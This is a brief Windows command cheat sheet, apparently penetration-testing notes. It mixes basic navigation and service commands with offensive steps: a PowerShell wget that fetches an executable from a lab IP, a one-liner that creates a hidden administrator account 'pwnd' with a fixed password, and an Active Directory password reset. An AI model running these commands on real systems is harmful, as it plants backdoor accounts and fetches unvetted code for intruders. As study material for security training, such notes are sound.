cd  
dir = ls  
more = cat  
pwd  
.\executable.exe // executable.ps1  
sc stop <service> (start/stop a service on local machine)  
sc start <service>
 
powershell -c wget "[http://10.11.1.198/Advanced.exe](http://10.11.1.198/Advanced.exe)" -outfile Advanced.exe
 
## Search files

Get-Childitem –Path C:\ -Include *FILE* -Recurse -ErrorAction SilentlyContinue
 
## Add admin user:

net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
 
## To change someone's password in Powershell:

PS C:\Users\phillip> Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose